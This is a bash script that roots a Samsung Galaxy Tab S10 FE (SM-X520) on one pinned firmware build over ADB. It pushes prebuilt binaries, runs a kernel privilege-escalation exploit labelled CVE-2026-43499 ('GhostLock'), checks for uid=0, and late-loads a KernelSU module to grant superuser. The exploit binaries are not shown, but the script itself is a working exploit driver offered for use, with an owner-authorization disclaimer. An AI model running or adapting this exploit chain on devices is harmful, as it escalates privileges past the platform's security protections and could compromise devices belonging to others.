#!/usr/bin/env bash
# One-command ADB root for the Samsung Galaxy Tab S10 FE (Wi-Fi, SM-X520)
# on firmware X520XXSACZH6 — CVE-2026-43499 (GhostLock) chain + KernelSU
# late-load. Use only on devices you own or are explicitly authorized to test.
set -u

ATTEMPTS="${ATTEMPTS:-8}"
DIR="$(cd "$(dirname "$0")" && pwd)"
T=/data/local/tmp

say()  { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

command -v adb >/dev/null 2>&1 || die "adb not found in PATH"
[ "$(adb get-state 2>/dev/null)" = "device" ] || {
    warn "device not ready: $(adb devices | tail -n +2 | head -2)"
    die "enable USB debugging and accept the authorization prompt, then retry"
}

MODEL="$(adb shell getprop ro.product.model | tr -d '\r')"
BUILD="$(adb shell getprop ro.build.version.incremental | tr -d '\r')"
[ "$MODEL" = "SM-X520" ] || die "unsupported model '$MODEL' (this payload is SM-X520 only)"
[ "$BUILD" = "X520XXSACZH6" ] || die "unsupported firmware '$BUILD' — this payload is pinned to X520XXSACZH6 (do NOT run it on other builds; offsets differ)"

say "device: $MODEL on $BUILD — staging payloads"
adb push "$DIR/bin/x520.so" "$T/x520.so" >/dev/null || die "push failed"
adb push "$DIR/bin/cve-2026-43499-root" "$T/cve-2026-43499-root" >/dev/null || die "push failed"
adb push "$DIR/bin/ksud" "$T/ksud-zh6" >/dev/null || die "push failed"
adb shell "chmod 755 $T/cve-2026-43499-root $T/x520.so $T/ksud-zh6"

say "running GhostLock exploit (attempts=$ATTEMPTS; this can take a few minutes)"
adb shell "EXPLOIT_ATTEMPTS=$ATTEMPTS P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  $T/cve-2026-43499-root --run-payload $T/x520.so $T/cve-2026-43499-root $T/x520-root.log" \
  || die "exploit failed — see /data/local/tmp/x520-root.log; REBOOT the tablet before retrying"

adb shell "$T/cve-2026-43499-root -c 'id'" | grep -q 'uid=0' \
    || die "root daemon not reachable after exploit"

say "staging KernelSU loader"
adb shell "$T/cve-2026-43499-root -c '/system/bin/cp $T/ksud-zh6 $T/ksud-s25u-kdp && /system/bin/cp $T/ksud-zh6 $T/.ksud-stage && /system/bin/chmod 755 $T/ksud-s25u-kdp $T/.ksud-stage'" \
    || die "staging failed"

say "loading KernelSU module (guarded late-load)"
adb shell "$T/cve-2026-43499-root --late-load" \
    || die "late-load failed"

LOADED="$(adb shell 'cat /proc/modules 2>/dev/null | grep -c kernelsu' | tr -d '\r')"
[ "$LOADED" -ge 1 ] || die "kernelsu module is not live — check logcat/dmesg"
say "kernelsu module is LIVE — SELinux state: $(adb shell getenforce | tr -d '\r')"
say "done. install/open the KernelSU Manager app to grant superuser."
say "root is per-boot: after each reboot re-run this script (or adb shell $T/root-x520.sh)."
